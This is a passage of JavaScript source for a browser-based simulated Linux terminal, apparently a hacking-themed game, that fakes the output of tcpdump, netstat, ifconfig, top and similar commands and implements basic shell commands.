            const packetSubtype = Math.random();

            if (packetSubtype < 0.05) {
                // SYN packet (5%) - new connection
                flags = 'Flags [S]';
                seqStart = Math.floor(Math.random() * 4000000000);
                seqEnd = seqStart;
                ack = 0;
                win = 65535;
                length = 0;
                conn.seq = seqStart + 1;
            } else if (packetSubtype < 0.08) {
                // SYN-ACK (3%)
                flags = 'Flags [S.]';
                seqStart = conn.seq;
                seqEnd = seqStart;
                ack = conn.ack;
                win = 65535;
                length = 0;
                conn.seq++;
            } else if (packetSubtype < 0.1) {
                // FIN packet (2%)
                flags = 'Flags [F.]';
                seqStart = conn.seq;
                length = 0;
                seqEnd = seqStart;
                ack = conn.ack;
                win = Math.floor(Math.random() * 65535);
                conn.seq++;
            } else if (packetSubtype < 0.11) {
                // RST packet (1%)
                flags = 'Flags [R.]';
                seqStart = conn.seq;
                seqEnd = seqStart;
                ack = conn.ack;
                win = 0;
                length = 0;
                delete connectionState[connKey];
            } else if (packetSubtype < 0.5) {
                // ACK only (39%)
                flags = 'Flags [.]';
                seqStart = conn.seq;
                length = 0;
                seqEnd = seqStart;
                ack = conn.ack;
                win = 28960 + Math.floor(Math.random() * 8000);
            } else {
                // PSH-ACK with data (50%)
                flags = 'Flags [P.]';
                length = Math.floor(Math.random() * 1460) + 1; // Realistic TCP payload
                seqStart = conn.seq;
                seqEnd = seqStart + length;
                ack = conn.ack;
                win = 28960 + Math.floor(Math.random() * 8000);

                // Update sequence number
                conn.seq += length;
                conn.ack += Math.floor(Math.random() * 500); // Acknowledge some data
            }

            // Format output
            if (length > 0) {
                return `${timestamp} IP ${srcIP}.${srcPort} > ${dstIP}.${dstPort}: ${flags}, seq ${seqStart}:${seqEnd}, ack ${ack}, win ${win}, length ${length}`;
            } else if (flags.includes('[S]') && !flags.includes('.')) {
                // SYN packet doesn't have ack
                return `${timestamp} IP ${srcIP}.${srcPort} > ${dstIP}.${dstPort}: ${flags}, seq ${seqStart}, win ${win}, options [mss 1460,nop,nop,sackOK], length ${length}`;
            } else {
                return `${timestamp} IP ${srcIP}.${srcPort} > ${dstIP}.${dstPort}: ${flags}, seq ${seqStart}, ack ${ack}, win ${win}, length ${length}`;
            }
        }
    };

    // If writing to file, do it differently
    if (writeFile) {
        // Show listening message in terminal
        const header = `tcpdump: listening on ${iface}, link-type EN10MB (Ethernet), capture size 262144 bytes`;
        const headerOutput = document.createElement('div');
        headerOutput.className = 'tk-terminal-output';
        headerOutput.textContent = header;
        terminalInnerContent.appendChild(headerOutput);
        terminalBody.scrollTop = terminalBody.scrollHeight;

        let capturedPackets = [];
        let packetsCaptured = 0;
        const maxCount = packetCount || 1000; // Default to 1000 if infinite

        // Simulate packet capture
        for (let i = 0; i < maxCount; i++) {
            if (window.isCommandInterrupted) break;

            // Random delay between packets (500ms to 4000ms)
            const delay = 500 + Math.random() * 3500;
            await new Promise(resolve => setTimeout(resolve, delay));

            if (window.isCommandInterrupted) break;

            // Capture 1-4 packets at a time
            const batchSize = Math.min(maxCount - i, Math.floor(Math.random() * 4) + 1);
            for (let j = 0; j < batchSize && i < maxCount; j++, i++) {
                capturedPackets.push(generatePacket(packetsCaptured));
                packetsCaptured++;

                if (packetCount && packetsCaptured >= packetCount) break;
            }
            i--; // Adjust for outer loop increment

            if (packetCount && packetsCaptured >= packetCount) break;
        }

        // Write to file
        const fileContent = capturedPackets.join('\n');
        if (createFile(writeFile, fileContent, false, currentDirectory)) {
            // Show statistics
            const stats = `\n${packetsCaptured} packets captured\n${packetsCaptured} packets received by filter\n0 packets dropped by kernel`;
            const statsOutput = document.createElement('div');
            statsOutput.className = 'tk-terminal-output';
            statsOutput.textContent = stats;
            terminalInnerContent.appendChild(statsOutput);
            terminalBody.scrollTop = terminalBody.scrollHeight;
        } else {
            return `tcpdump: ${writeFile}: Permission denied`;
        }

        return null; // Already displayed output via DOM
    } else {
        // Display to terminal
        const header = `tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on ${iface}, link-type EN10MB (Ethernet), capture size 262144 bytes`;
        const headerOutput = document.createElement('div');
        headerOutput.className = 'tk-terminal-output';
        headerOutput.textContent = header;
        terminalInnerContent.appendChild(headerOutput);
        terminalBody.scrollTop = terminalBody.scrollHeight;

        let packetsCaptured = 0;
        const maxCount = packetCount || 10000; // Large number for "infinite"

        for (let i = 0; i < maxCount; i++) {
            if (window.isCommandInterrupted) break;

            // Random delay between packets (500ms to 4000ms)
            const delay = 500 + Math.random() * 3500;
            await new Promise(resolve => setTimeout(resolve, delay));

            if (window.isCommandInterrupted) break;

            // Output 1-4 packets at a time
            const batchSize = Math.min(maxCount - i, Math.floor(Math.random() * 4) + 1);
            for (let j = 0; j < batchSize && i < maxCount; j++, i++) {
                const packet = generatePacket(packetsCaptured);
                const packetOutput = document.createElement('div');
                packetOutput.className = 'tk-terminal-output';
                packetOutput.textContent = packet;
                terminalInnerContent.appendChild(packetOutput);
                terminalBody.scrollTop = terminalBody.scrollHeight;
                packetsCaptured++;

                if (packetCount && packetsCaptured >= packetCount) break;
            }
            i--; // Adjust for outer loop increment

            if (packetCount && packetsCaptured >= packetCount) break;
        }

        // Show statistics
        const stats = `\n${packetsCaptured} packets captured\n${packetsCaptured} packets received by filter\n0 packets dropped by kernel`;
        const statsOutput = document.createElement('div');
        statsOutput.className = 'tk-terminal-output';
        statsOutput.textContent = stats;
        terminalInnerContent.appendChild(statsOutput);
        terminalBody.scrollTop = terminalBody.scrollHeight;

        return null; // Already displayed output via DOM
    }
}

function generateWhoOutput() {
    const now = new Date();
    const oneDayAgo = new Date(now);
    oneDayAgo.setDate(oneDayAgo.getDate() - 1);

    const formatDate = (date) => {
        const month = (date.getMonth() + 1).toString().padStart(2, '0');
        const day = date.getDate().toString().padStart(2, '0');
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${month}-${day} ${hours}:${minutes}`;
    };

    return `root               pts/0       ${formatDate(now)} (192.168.1.100)\nroot               pts/1       ${formatDate(oneDayAgo)} (192.168.1.101)\nblackpacket        pts/2       ${formatDate(now)} (192.168.1.102)`;
}

function generatePsOutput() {
    return `  PID TTY          TIME CMD\n 1234 pts/0    00:00:00 bash\n 5678 pts/0    00:00:00 ps\n 4321 ?        00:00:01 sshd\n 8765 ?        00:00:00 systemd`;
}

function generateTopOutput() {
    return `top - 14:35:01 up 1 day,  2:30,  3 users,  load average: 0.12, 0.15, 0.18\nTasks: 125 total,   1 running, 124 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  2.3 us,  1.2 sy,  0.0 ni, 96.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   7844.2 total,   5216.5 free,   1543.2 used,   1084.5 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   6543.2 avail Mem\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n 4321 root      20   0   92320   6544   4321 S   2.3   0.1   0:01.23 sshd\n 1234 root      20   0   12345   3456   2345 S   0.0   0.0   0:00.05 bash`;
}

function generateIfconfigOutput() {
    return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)\n        RX packets 123456  bytes 123456789 (123.4 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 98765  bytes 98765432 (98.7 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 1234  bytes 123456 (123.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 1234  bytes 123456 (123.4 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nwlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe8b:33c2  prefixlen 64  scopeid 0x20<link>\n        ether 00:11:22:33:44:55  txqueuelen 1000  (Ethernet)\n        RX packets 45678  bytes 45678901 (45.6 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 34567  bytes 34567890 (34.5 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0`;
}

function generateNetstatOutput() {
    const localIP = '192.168.1.100';
    const connections = [];

    // Always include SSH listener
    connections.push('tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN');
    connections.push('tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN');

    // Add SSH connections if in SSH session
    if (window.sshOriginalEnvironment) {
        const randomPort = 40000 + Math.floor(Math.random() * 10000);
        connections.push(`tcp        0      0 ${localIP}:22        192.168.1.101:${randomPort}     ESTABLISHED`);
    }

    // Add connections from recent network activity (check DNS cache)
    let addedConnections = 0;
    for (const hostname in dnsCache) {
        if (addedConnections >= 5) break; // Limit to 5 connections

        const ip = dnsCache[hostname];
        const localPort = 40000 + Math.floor(Math.random() * 10000);
        const states = ['ESTABLISHED', 'TIME_WAIT', 'CLOSE_WAIT'];
        const state = states[Math.floor(Math.random() * states.length)];
        const port = Math.random() > 0.5 ? 80 : 443;

        connections.push(`tcp        0      0 ${localIP}:${localPort}      ${ip}:${port}          ${state}`);
        addedConnections++;
    }

    // Add some random local connections
    const randomConnections = 3 + Math.floor(Math.random() * 3);
    for (let i = 0; i < randomConnections; i++) {
        const localPort = 40000 + Math.floor(Math.random() * 10000);
        const remoteIP = `${Math.floor(Math.random() * 200 + 50)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        const remotePort = [80, 443, 8080, 3306, 5432][Math.floor(Math.random() * 5)];
        const states = ['ESTABLISHED', 'TIME_WAIT', 'CLOSE_WAIT', 'SYN_SENT'];
        const state = states[Math.floor(Math.random() * states.length)];

        connections.push(`tcp        0      0 ${localIP}:${localPort}      ${remoteIP}:${remotePort}      ${state}`);
    }

    connections.push('tcp6       0      0 :::22                   :::*                    LISTEN');

    let output = 'Active Internet connections (servers and established)\n';
    output += 'Proto Recv-Q Send-Q Local Address           Foreign Address         State\n';
    output += connections.join('\n');
    output += '\n\nActive UNIX domain sockets (servers and established)\n';
    output += 'Proto RefCnt Flags       Type       State         I-Node   Path\n';
    output += 'unix  2      [ ACC ]     STREAM     LISTENING     12345    /var/run/dbus/system_bus_socket\n';
    output += 'unix  3      [ ]         STREAM     CONNECTED     23456    /var/run/acpid.socket';

    return output;
}

function generateRouteOutput() {
    return `Kernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         192.168.1.1     0.0.0.0         UG    100    0        0 eth0\n192.168.1.0     *               255.255.255.0   U     100    0        0 eth0`;
}

function generateWhoisOutput(domain) {
    // Resolve hostname to show IP in whois output
    const resolvedIP = resolveHostname(domain);

    return `Domain Name: ${domain}\nRegistry Domain ID: D123456789-LROR\nRegistrar WHOIS Server: whois.example-registrar.com\nRegistrar URL: http://www.example-registrar.com\nUpdated Date: 2024-01-15T10:20:30Z\nCreation Date: 2020-03-10T15:30:45Z\nRegistry Expiry Date: 2026-03-10T15:30:45Z\nRegistrar: Example Registrar, Inc.\nName Server: NS1.EXAMPLE-DNS.COM\nName Server: NS2.EXAMPLE-DNS.COM\nIP Address: ${resolvedIP}`;
}

function generateNslookupOutput(domain) {
    // Resolve hostname to consistent IP
    const resolvedIP = resolveHostname(domain);

    return `Server:         8.8.8.8\nAddress:        8.8.8.8#53\n\nNon-authoritative answer:\nName:   ${domain}\nAddress: ${resolvedIP}`;
}

function generateIptablesOutput() {
    return `Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\nACCEPT     all  --  anywhere             anywhere\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh\n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination`;
}

// ============================================================================
// COMMAND IMPLEMENTATIONS
// ============================================================================

const commands = {
    // Built-in commands (don't need to be in PATH)
    cd: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                if (args[1] === '-') {
                    ctx.setNewCurrentDirectory(environment.OLDPWD, environment.CWD);
                } else if (args[1] === '~') {
                    ctx.setNewCurrentDirectory(environment.HOME, environment.CWD);
                } else {
                    const newDir = changeDirectory(args[1], environment.CWD);
                    if (newDir === false) {
                        return `cd: ${args[1]}: No such file or directory`;
                    }
                    ctx.setNewCurrentDirectory(newDir, environment.CWD);
                }
            } else {
                ctx.setNewCurrentDirectory(environment.HOME, environment.CWD);
            }
            return '';
        }
    },

    pwd: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            return environment.CWD;
        }
    },

    export: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                const assignment = args.slice(1).join(' ');
                const match = assignment.match(/^([a-zA-Z_][a-zA-Z0-9_]*)=(.*)$/);
                if (match) {
                    const varName = match[1];
                    const varValue = match[2];
                    environment[varName] = varValue;
                    return '';
                } else {
                    return `export: usage: export [-fn] [-p] [name[=value] ...] or export -p`;
                }
            } else {
                return Object.keys(environment).map(key => `declare -x ${key}="${environment[key]}"`).join('\n');
            }
        }
    },

    env: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            return Object.keys(environment).map(key => `${key}=${environment[key]}`).join('\n');
        }
    },

    // Commands that need to be in PATH
    help: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return `Available commands:

File Operations:
  ls, cd, pwd, cat, head, tail, more, less, touch, find, grep, chmod, chown, tar, gzip

Network Tools:
  ping, nmap, traceroute, tcpdump, ssh, scp, curl, wget, nc (netcat), telnet
  ifconfig, netstat, route, whois, nslookup, dig, host, arp, iptables

Wireless Tools:
  iwconfig, airodump-ng, aircrack-ng

Security/Hacking Tools:
  john, hashcat, strings, base64, md5sum, sha256sum, openssl

System Info:
  whoami, hostname, uname, date, w, who, ps, top, history, finger

User Management:
  su, sudo, useradd, exit

Package Management:
  apt, dpkg

Other:
  echo, clear, export, env, bash, which, help

Tips:
- Use pipes (|) to chain commands together (e.g., cat file.txt | grep pattern | more)
- Use > to redirect output to a file (e.g., ls > files.txt)
- Use >> to append output to a file (e.g., echo "new line" >> files.txt)
- Use && to run commands sequentially if previous succeeds (e.g., cd /tmp && ls)
- Use || to run a command if the previous fails (e.g., cat file.txt || echo "not found")
- Use ; to run multiple commands regardless of success (e.g., echo hello; echo world)`;
        }
    },

    ls: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let showHidden = false;
            let longFormat = false;
            let explicitPaths = [];

            for (let i = 1; i < args.length; i++) {
                if (args[i].startsWith('-')) {
                    if (args[i].includes('a')) showHidden = true;
                    if (args[i].includes('l')) longFormat = true;
                } else {
                    explicitPaths.push(args[i]);
                }
            }

            let pathsToProcess = [];
            if (explicitPaths.length === 0) {
                pathsToProcess.push(environment.CWD);
            } else {
                // Expand glob patterns
                for (const p of explicitPaths) {
                    if (p.includes('*') || p.includes('?')) {
                        // Handle multi-level glob patterns (e.g., */*/*)
                        const expandedPaths = expandGlobPattern(p, environment.CWD, showHidden);
                        pathsToProcess.push(...expandedPaths);
                    } else {
                        pathsToProcess.push(resolvePath(p, environment.CWD));
                    }
                }
            }

            let lsOutputItems = [];

            for (const currentPath of pathsToProcess) {
                const fileEntry = getFile(currentPath);
                const dirEntry = getDirectory(currentPath);

                if (fileEntry && fileEntry.type === 'file') {
                    lsOutputItems.push({
                        name: currentPath.split('/').pop(),
                        type: fileEntry.type,
                        owner: fileEntry.owner,
                        group: fileEntry.group,
                        size: fileEntry.size,
                        lastModified: fileEntry.lastModified
                    });
                } else if (dirEntry && dirEntry.type === 'directory') {
                    const listedContents = listDirectory(currentPath, showHidden);
                    if (typeof listedContents === 'string') {
                        lsOutputItems.push(listedContents);
                    } else {
                        if (pathsToProcess.length > 1) {
                            lsOutputItems.push(`${currentPath}:`);
                        }
                        lsOutputItems = lsOutputItems.concat(listedContents);
                    }
                } else {
                    lsOutputItems.push(`ls: cannot access '${currentPath}': No such file or directory`);
                }
            }

            if (longFormat) {
                return lsOutputItems.map(item => {
                    if (typeof item === 'string') return item;
                    const permissions = item.type === 'directory' ? 'drwxr-xr-x' : '-rw-r--r--';
                    const links = item.type === 'directory' ? 2 : 1;
                    const size = item.size.toString().padStart(6, ' ');
                    const date = item.lastModified.substring(0, 10);
                    const time = item.lastModified.substring(11, 16);
                    return `${permissions} ${links} ${item.owner.padEnd(8)} ${item.group.padEnd(8)} ${size} ${date} ${time} ${item.name}`;
                }).join('\n');
            } else {
                return lsOutputItems.map(item => {
                    if (typeof item === 'string') return item;
                    return item.name;
                }).join('  ');
            }
        }
    },

    cat: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Check if input is from a pipe
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                return ctx.pipeInput;
            }

            if (args.length > 1) {
                const content = readFile(args[1], environment.CWD);
                if (content === false) {
                    return `cat: ${args[1]}: No such file or directory`;
                }
                return content;
            }
            return '';
        }
    },

    head: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let lines = 10; // default
            let content = '';

            // Parse -n flag for number of lines
            let fileArgIndex = 1;
            if (args.length > 1 && args[1] === '-n' && args.length > 2) {
                lines = parseInt(args[2]);
                fileArgIndex = 3;
            } else if (args.length > 1 && args[1].startsWith('-') && !isNaN(args[1].substring(1))) {
                lines = parseInt(args[1].substring(1));
                fileArgIndex = 2;
            }

            // Check if input is from a pipe
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                content = ctx.pipeInput;
            } else if (args.length > fileArgIndex) {
                const fileContent = readFile(args[fileArgIndex], environment.CWD);
                if (fileContent === false) {
                    return `head: ${args[fileArgIndex]}: No such file or directory`;
                }
                content = fileContent;
            } else {
                return 'Usage: head [-n lines] [file]';
            }

            const allLines = content.split('\n');
            return allLines.slice(0, lines).join('\n');
        }
    },

    tail: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let lines = 10; // default
            let content = '';

            // Parse -n flag for number of lines
            let fileArgIndex = 1;
            if (args.length > 1 && args[1] === '-n' && args.length > 2) {
                lines = parseInt(args[2]);
                fileArgIndex = 3;
            } else if (args.length > 1 && args[1].startsWith('-') && !isNaN(args[1].substring(1))) {
                lines = parseInt(args[1].substring(1));
                fileArgIndex = 2;
            }

            // Check if input is from a pipe
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                content = ctx.pipeInput;
            } else if (args.length > fileArgIndex) {
                const fileContent = readFile(args[fileArgIndex], environment.CWD);
                if (fileContent === false) {
                    return `tail: ${args[fileArgIndex]}: No such file or directory`;
                }
                content = fileContent;
            } else {
                return 'Usage: tail [-n lines] [file]';
            }

            const allLines = content.split('\n');
            return allLines.slice(-lines).join('\n');
        }
    },

    echo: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let echoString = args.slice(1).join(' ');
            if (echoString.startsWith('"') && echoString.endsWith('"')) {
                echoString = echoString.substring(1, echoString.length - 1);
            }
            return echoString.replace(/\\n/g, '\n');
        }
    },

    clear: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            ctx.terminalInnerContent.innerHTML = '';
            return null; // Special return to prevent adding output
        }
    },

    whoami: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return environment.USER;
        }
    },

    date: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return new Date().toString().replace(/202[0-4]/, '2025');
        }
    },

    uname: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return 'Linux blackpacket 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux';
        }
    },

    ping: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                // If redirecting to file, return text output
                if (ctx.outputFile) {
                    return await generatePingOutput(args, null, ctx.terminalInnerContent, ctx.terminalBody, true);
                }
                // Otherwise, output to terminal
                const output = document.createElement('div');
                output.className = 'tk-terminal-output';
                ctx.terminalInnerContent.appendChild(output);
                await generatePingOutput(args, output, ctx.terminalInnerContent, ctx.terminalBody, false);
                return null;
            }
            return 'Usage: ping [-c count] <hostname or IP>';
        }
    },

    traceroute: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                // If redirecting to file, return text output
                if (ctx.outputFile) {
                    return await generateTracerouteOutput(args[1], ctx.terminalInnerContent, ctx.terminalBody, true);
                }
                // Otherwise, output to terminal
                const output = document.createElement('div');
                output.className = 'tk-terminal-output';
                ctx.terminalInnerContent.appendChild(output);
                await generateTracerouteOutput(args[1], ctx.terminalInnerContent, ctx.terminalBody, false);
                return null;
            }
            return 'Usage: traceroute <hostname or IP>';
        }
    },

    nmap: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                return generateNmapOutput(args[1]);
            }
            return 'Usage: nmap <hostname or IP>';
        }
    },

    tcpdump: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return await generateTcpdumpOutput(args, createFile, environment.CWD, ctx.terminalInnerContent, ctx.terminalBody);
        }
    },

    w: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateWhoOutput();
        }
    },

    who: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateWhoOutput();
        }
    },

    ps: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generatePsOutput();
        }
    },

    top: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Save terminal history for restore on exit
            const savedHistory = ctx.terminalInnerContent.innerHTML;

            // Generate dynamic process list
            function generateProcesses() {
                const processes = [
                    { pid: 1, user: 'root', pr: 20, ni: 0, virt: 169856, res: 13672, shr: 8912, s: 'S', cpu: 0.0, mem: 0.2, time: '0:02.15', command: 'systemd' },
                    { pid: 2, user: 'root', pr: 20, ni: 0, virt: 0, res: 0, shr: 0, s: 'S', cpu: 0.0, mem: 0.0, time: '0:00.01', command: 'kthreadd' },
                    { pid: 1234, user: environment.USER, pr: 20, ni: 0, virt: 12345, res: 3456, shr: 2345, s: 'S', cpu: 0.0, mem: 0.0, time: '0:00.05', command: 'bash' },
                    { pid: 4321, user: 'root', pr: 20, ni: 0, virt: 92320, res: 6544, shr: 4321, s: 'S', cpu: 2.3, mem: 0.1, time: '0:01.23', command: 'sshd' },
                    { pid: 5678, user: environment.USER, pr: 20, ni: 0, virt: 223456, res: 45678, shr: 12345, s: 'R', cpu: 15.2, mem: 0.6, time: '1:23.45', command: 'firefox' },
                    { pid: 8765, user: 'root', pr: 20, ni: 0, virt: 456789, res: 123456, shr: 54321, s: 'S', cpu: 5.1, mem: 1.6, time: '5:43.21', command: 'Xorg' },
                    { pid: 9123, user: environment.USER, pr: 20, ni: 0, virt: 167890, res: 23456, shr: 8765, s: 'S', cpu: 3.7, mem: 0.3, time: '0:45.67', command: 'gnome-shell' },
                    { pid: 9456, user: environment.USER, pr: 20, ni: 0, virt: 98765, res: 12345, shr: 6789, s: 'S', cpu: 1.2, mem: 0.2, time: '0:12.34', command: 'terminal' },
                    { pid: 10234, user: 'root', pr: 20, ni: 0, virt: 54321, res: 8765, shr: 4321, s: 'S', cpu: 0.3, mem: 0.1, time: '0:05.43', command: 'systemd-journal' },
                    { pid: 10567, user: 'mysql', pr: 20, ni: 0, virt: 1234567, res: 234567, shr: 23456, s: 'S', cpu: 8.9, mem: 3.0, time: '12:34.56', command: 'mysqld' },
                    { pid: 11234, user: 'www-data', pr: 20, ni: 0, virt: 345678, res: 45678, shr: 12345, s: 'S', cpu: 4.5, mem: 0.6, time: '2:34.56', command: 'nginx' },
                    { pid: 11567, user: environment.USER, pr: 20, ni: 0, virt: 234567, res: 34567, shr: 9876, s: 'S', cpu: 2.1, mem: 0.4, time: '0:23.45', command: 'chrome' },
                ];

                // Randomize CPU and memory slightly for realism
                processes.forEach(p => {
                    p.cpu = Math.max(0, p.cpu + (Math.random() - 0.5) * 2).toFixed(1);
                    p.mem = Math.max(0, p.mem + (Math.random() - 0.5) * 0.2).toFixed(1);
                });

                return processes;
            }

            // Initial display
            let sortBy = 'cpu'; // Default sort by CPU
            let processes = generateProcesses();
            let running = true;

            const displayTop = () => {
                // Sort processes
                processes.sort((a, b) => {
                    if (sortBy === 'cpu') return parseFloat(b.cpu) - parseFloat(a.cpu);
                    if (sortBy === 'mem') return parseFloat(b.mem) - parseFloat(a.mem);
                    if (sortBy === 'pid') return a.pid - b.pid;
                    return 0;
                });

                const uptime = `${Math.floor(Math.random() * 5) + 1} day, ${Math.floor(Math.random() * 24)}:${String(Math.floor(Math.random() * 60)).padStart(2, '0')}`;
                const load1 = (Math.random() * 2).toFixed(2);
                const load5 = (Math.random() * 2).toFixed(2);
                const load15 = (Math.random() * 2).toFixed(2);
                const totalTasks = processes.length;
                const runningCount = processes.filter(p => p.s === 'R').length;
                const sleeping = processes.filter(p => p.s === 'S').length;
                const cpuUser = (Math.random() * 20).toFixed(1);
                const cpuSys = (Math.random() * 10).toFixed(1);
                const cpuIdle = (100 - parseFloat(cpuUser) - parseFloat(cpuSys)).toFixed(1);

                let output = `top - ${new Date().toTimeString().substring(0, 8)} up ${uptime},  ${Math.floor(Math.random() * 3) + 1} users,  load average: ${load1}, ${load5}, ${load15}\n`;
                output += `Tasks: ${totalTasks} total,   ${runningCount} running, ${sleeping} sleeping,   0 stopped,   0 zombie\n`;
                output += `%Cpu(s): ${cpuUser} us, ${cpuSys} sy,  0.0 ni, ${cpuIdle} id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\n`;
                output += `MiB Mem :   7844.2 total,   ${(Math.random() * 3000 + 3000).toFixed(1)} free,   ${(Math.random() * 2000 + 1000).toFixed(1)} used,   1084.5 buff/cache\n`;
                output += `MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   ${(Math.random() * 1000 + 6000).toFixed(1)} avail Mem\n\n`;
                output += `  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n`;

                // Show top 10 processes
                processes.slice(0, 10).forEach(p => {
                    output += `${String(p.pid).padStart(5)} ${p.user.padEnd(9)} ${String(p.pr).padStart(2)}   ${String(p.ni).padStart(2)} ${String(p.virt).padStart(7)} ${String(p.res).padStart(6)} ${String(p.shr).padStart(6)} ${p.s}  ${String(p.cpu).padStart(4)}  ${String(p.mem).padStart(4)} ${p.time.padStart(9)} ${p.command}\n`;
                });

                output += `\n[Press q to quit, M to sort by memory, P to sort by CPU, N to sort by PID, R to refresh]`;

                return output;
            };

            // Clear terminal and display top
            ctx.terminalInnerContent.innerHTML = '';
            const topOutput = document.createElement('div');
            topOutput.className = 'tk-terminal-output';
            topOutput.style.whiteSpace = 'pre';
            topOutput.textContent = displayTop();
            ctx.terminalInnerContent.appendChild(topOutput);
            ctx.terminalBody.scrollTop = 0;

            while (running) {
                const key = await ctx.waitKey();

                if (key === 'q' || key === 'Q' || key === 'CTRL_C') {
                    running = false;
                } else if (key === 'M' || key === 'm') {
                    sortBy = 'mem';
                    processes = generateProcesses();
                    topOutput.textContent = displayTop();
                } else if (key === 'P' || key === 'p') {
                    sortBy = 'cpu';
                    processes = generateProcesses();
                    topOutput.textContent = displayTop();
                } else if (key === 'N' || key === 'n') {
                    sortBy = 'pid';
                    processes = generateProcesses();
                    topOutput.textContent = displayTop();
                } else if (key === 'R' || key === 'r') {
                    processes = generateProcesses();
                    topOutput.textContent = displayTop();
                }

                ctx.terminalBody.scrollTop = 0;
            }

            // Restore terminal history
            ctx.terminalInnerContent.innerHTML = savedHistory;
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            return null;
        }
    },

    ifconfig: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateIfconfigOutput();
        }
    },

    iwconfig: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return `lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Frequency:2.437 GHz  Access Point: Not-Associated
          Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off`;
        }
    },

    netstat: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateNetstatOutput();
        }
    },

    route: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateRouteOutput();
        }
    },

    iptables: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return generateIptablesOutput();
        }
    },

    whois: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                return generateWhoisOutput(args[1]);
            }
            return 'Usage: whois <domain>';
        }
    },

    nslookup: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                return generateNslookupOutput(args[1]);
            }
            return 'Usage: nslookup <domain>';
        }
    },

    hostname: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                environment.HOSTNAME = args[1];
                return '';
            }
            return environment.HOSTNAME;
        }
    },

    ssh: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Usage: ssh <user@host> or ssh <host>';
            }

            let targetUser = environment.USER; // Default to current user
            let targetHost = args[1];

            // Parse user@host format
            if (args[1].includes('@')) {
                const parts = args[1].split('@');
                targetUser = parts[0];
                targetHost = parts[1];
            }

            // Resolve hostname to IP and check if SSH is enabled
